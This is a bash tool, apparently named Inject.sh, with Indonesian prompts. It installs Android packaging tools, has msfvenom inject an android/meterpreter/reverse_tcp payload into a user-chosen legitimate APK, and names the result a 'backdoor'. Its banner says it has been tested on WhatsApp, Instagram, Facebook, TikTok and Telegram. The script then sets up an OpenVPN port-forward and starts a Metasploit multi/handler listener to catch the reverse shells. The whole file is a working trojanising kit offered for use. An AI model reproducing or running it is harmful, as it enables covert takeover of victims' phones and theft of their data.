#!/bin/bash
#fix create payload manual msfvenom
#apt-get install lib32stdc++6 lib32ncurses6 lib32z1++ -y
# installing apktool 2.6.1
# check requirements
path=$(pwd)
spiner(){
bar=" ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
barlength=${#bar}
i=0
while ((i < 100));
do
	n=$((i*barlength / 100))
	printf "$ku1\r[%-${barlength}s]" "${bar:0:n}"
	((i += 1))
	sleep 0
	done
}



RED="$(printf '\033[31m')"
GREEN="$(printf '\033[32m')"
ORANGE="$(printf '\033[33m')"
BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"
CYAN="$(printf '\033[36m')"
WHITE="$(printf '\033[37m')"
BLACK="$(printf '\033[30m')"
BLACKBG="$(printf '\033[40m')"
RESETFG="$(printf '\e033[0m')"
RESETBG="$(printf '\e[0m\n')"




function baner() {

cat <<- EOF
 ${GREEN}__    __     ______     ______   __         ______     __     ______  
/\ "-./  \   /\  ___\   /\  == \ /\ \       /\  __ \   /\ \   /\__  _\ 
\ \ \-./\ \  \ \___  \  \ \  _-/ \ \ \____  \ \ \/\ \  \ \ \  \/_/\ \/ 
${WHITE} \ \_\ \ \_\  \/\_____\  \ \_\    \ \_____\  \ \_____\  \ \_\    \ \_\ 
  \/_/  \/_/   \/_____/   \/_/     \/_____/   \/_____/   \/_/     \/_/ 
                                                                       
                             ${BLUE}./Inject.sh
                   ${GREEN}Tested, Whatsapp, Instagram, Fb
            ${YELLOW}Tiktok, Telegram, Line, Twitter, Mobile Legend
                     ${WHITE}Version 1.1 Copyright @K1M4K-ID
                  ${BLUE}Github : https://github.com/K1M4K-ID
                             YT : K1M4K-ID


EOF
  #statements
}



clear
baner
printf "\033[31;1m[\033[34;1m*\033[31;1m]\033[37;1m please wait . . . .\n\n"
apt-get install libantlr3-runtime-java -y > /dev/null 2>&1
apt-get install libcommons-cli-java -y > /dev/null 2>&1
apt-get install libcommons-io-java -y > /dev/null 2>&1
apt-get install libcommons-lang3-java -y > /dev/null 2>&1
apt-get install libcommons-text-java -y > /dev/null 2>&1
apt-get install libguava-java -y > /dev/null 2>&1 
apt-get install libsmali-java -y > /dev/null 2>&1
apt-get install libstringtemplate-java -y > /dev/null 2>&1
apt-get install libxmlunit-java -y > /dev/null 2>&1 
apt-get install libxpp3-java -y > /dev/null 2>&1
apt-get install libyaml-snake-java -y > /dev/null 2>&1

if [ -f /usr/local/bin/apktool ]; then
    printf "	\033[31;1m[\033[32;1mOK\033[31;1m]\033[37;1m apktool is already exists!\n"
    else
    printf "	\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m installing apktool!\n"
    wget --no-check-certificate "https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool" -O /usr/local/bin/apktool && chmod +x /usr/local/bin/apktool
    wget --no-check-certificate "https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.6.1.jar" -O /usr/local/bin/apktool.jar && chmod +x /usr/local/bin/apktool.jar
    fi
    sleep 0.025
    
if [ -f /usr/bin/apksigner ]; then
    printf "	\033[31;1m[\033[32;1mOK\033[31;1m]\033[37;1m apksigner is already exists!\n"
    else
    printf "	\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m installing apksigner!\n"
    apt-get install apksigner -y
    fi
    sleep 0.025

if [ -f /usr/bin/zipalign ]; then
    printf "	\033[31;1m[\033[32;1mOK\033[31;1m]\033[37;1m zipalign is already exists!\n"
    else
    printf "	\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m installing zipalign!\n"
    apt-get install zipalign -y
    fi
    sleep 0.025
    
if [ -f /usr/bin/java ]; then
    printf "	\033[31;1m[\033[32;1mOK\033[31;1m]\033[37;1m jarsigner is already exists!\n"
    else
    printf "	\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m installing jarsigner!\n"
    apt-get install openjdk-11-jdk -y
    fi
    sleep 0.025
    
if [ -f /usr/bin/aapt ]; then
    printf "	\033[31;1m[\033[32;1mOK\033[31;1m]\033[37;1m aapt is already exists!\n"
    else
    printf "	\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m installing aapt!\n"
    apt-get install zipalign -y
    fi
    sleep 0.025
    
if [ -d /usr/share/android-framework-res ]; then
    printf "	\033[31;1m[\033[32;1mOK\033[31;1m]\033[37;1m android-framework-res is already exists!\n"
    else
    printf "	\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m installing android-framework-res!\n"
    apt-get install android-framework-res -y
    fi
    sleep 0.025        


printf "\n\033[31;1m[\033[34;1m*\033[31;1m]\033[37;1m selesai, happy hunting!!\n"
sleep 5
clear
function xyz()
{
 orig=$(zenity --title " Aplikasi Original " --filename=$path --file-selection --file-filter "*.apk" --text "chose the original (apk)" 2> /dev/null)
}
function ovpn()
{
 vpn=$(zenity --title " Vpn Start " --filename=$path --file-selection --file-filter "*.ovpn" --text "chose the config (ovpn)" 2> /dev/null)
}
function sets_original(){
        clear
        baner
        printf '\033[31;1m'
        echo
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] sekarang masukan ip untuk backdoor anda\033[31;1m\n"
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] local ip address anda, eth0  (\033[31;1mlocal\033[37;1m)\033[31;1m\n"
        spiner
        echo
        echo
        ifconfig eth0|grep "inet"|awk 'NR == 1 {print $2}'
        echo
        spiner
        printf "\033[37;1m\n[\033[32;1m*\033[37;1m] local ip address anda, wlan0 (\033[31;1mwifi\033[37;1m)\033[31;1m\n"
        spiner
        echo
        echo
        ifconfig wlan0|grep "inet"|awk 'NR == 1 {print $2}'
        echo
        spiner
        echo
        read -p "$(printf "\033[37;1m[\033[31;1m*\033[37;1m] masukan lhost  : "'\033[34;1m')" lh
        printf '\033[31;1m'
        spiner
        echo
        read -p "$(printf "\033[37;1m[\033[31;1m*\033[37;1m] masukan port   : "'\033[34;1m')" lp
        printf '\033[31;1m'
        spiner
        echo
        read -p "$(printf "\033[37;1m[\033[31;1m*\033[37;1m] nama backdoor  : "'\033[34;1m')" nama
        printf '\033[31;1m'
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] generate backdoor . . . please wait\033[31;1m\n"
        printf '\033[31;1m'
        spiner
        echo
        sleep 2
}

function inject_payload(){
        sudo msfvenom -x $orig -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -a dalvik --platform android --arch dalvik -o $path/$nama.apk | awk 'NR == 9 {print $0}' > /dev/null 2>&1
        spiner
        echo
}

function listener_kali(){
        clear
        baner
        printf "\033[37;1m[\033[32;1m*\033[37;1m] masukan config portmap..\033[31;1m\n"
	sleep 5
	ovpn;xterm -title "start sniffing" -bg "#000000" -fg "#FFFFFF" -fa "Monospace" -fs 10 -e "openvpn --config $vpn" > /dev/null 2>&1 &
	sleep 2
        printf '\033[31;1m'
        echo
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] sekarang masukan ip listener anda\033[31;1m\n"
        spiner
        echo
        sleep 0.025
        printf "\033[37;1m[\033[32;1m*\033[37;1m] local ip address anda, eth0  (\033[31;1mlocal\033[37;1m)\033[31;1m\n"
        spiner
        echo
        echo
        ifconfig eth0|grep "inet"|awk 'NR == 1 {print $2}'
        echo
        spiner
        sleep 0.025
        printf "\033[37;1m\n[\033[32;1m*\033[37;1m] local ip address anda, wlan0 (\033[31;1mwifi\033[37;1m)\033[31;1m\n"
        spiner
        echo
        echo
        sleep 0.025
        ifconfig wlan0|grep "inet"|awk 'NR == 1 {print $2}'
        echo
        spiner
        echo
        sleep 0.025
        printf "\033[37;1m[\033[32;1m*\033[37;1m] forward ip address anda, tun0(\033[31;1mforward\033[37;1m)\n"
        printf '\033[31;1m'
        spiner
        echo
        echo
        sleep 0.025
        ifconfig tun0|grep "inet"|awk 'NR == 1 {print $2}'
        echo
        spiner
        echo
        sleep 0.025
        read -p "$(printf "\033[37;1m[\033[31;1m*\033[37;1m] masukan lhost  : "'\033[34;1m')" lh
        printf '\033[31;1m'
        spiner
        echo
        sleep 0.025
        read -p "$(printf "\033[37;1m[\033[31;1m*\033[37;1m] masukan port   : "'\033[34;1m')" lp
        printf '\033[31;1m'
        spiner
        echo
        sleep 0.025
        printf "\033[37;1m[\033[32;1m*\033[37;1m] starting apache2 && database (\033[32;1mruning\033[37;1m)\n"
        printf '\033[31;1m'
        spiner
        echo
        sleep 0.025
        service apache2 start > /dev/null
        printf "\033[37;1m[\033[32;1m*\033[37;1m] apache server\033[31;1m [\033[32;1mOK\033[31;1m]\n"
        spiner
        echo
        sleep 0.025
        service postgresql start > /dev/null
        printf "\033[37;1m[\033[32;1m*\033[37;1m] postgresql\033[31;1m   [\033[32;1mOK\033[31;1m]\n"
        spiner
        echo
        sleep 0.025
        printf "\033[37;1m[\033[32;1m*\033[37;1m] starting metasploit listener . . .\033[31;1m\n"
        spiner
        echo
        sleep 2
        clear
}

function listerners(){
    clear
    baner
    printf "\033[31;1m[\033[32;1m1\033[31;1m] \033[37;1mlisterner\033[32;1m android\033[31;1m\n"
    sleep 0.025
    printf "\033[31;1m[\033[32;1mx\033[31;1m] \033[37;1mkembali\033[31;1m\n\n"
    sleep 0.025
    read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
    sleep 0.025
    printf '\033[31;1m'
    echo
    if [ $xyz = "1"  ];
    then
    listener_kali
	msfconsole -x "use exploit/multi/handler;set payload android/meterpreter/reverse_tcp;set LHOST $lh;set LPORT $lp;exploit;"
	clear
	listerners

	elif [ $xyz = "x"  ];
	then
	exit;

	else
        printf "\033[31;1m[\033[37;1m!\033[31;1m]\033[37;1m masukan input dengan benar . .\n"
	sleep 2
	clear
	listerners

	fi
}


sets_original
xyz
inject_payload
listerners
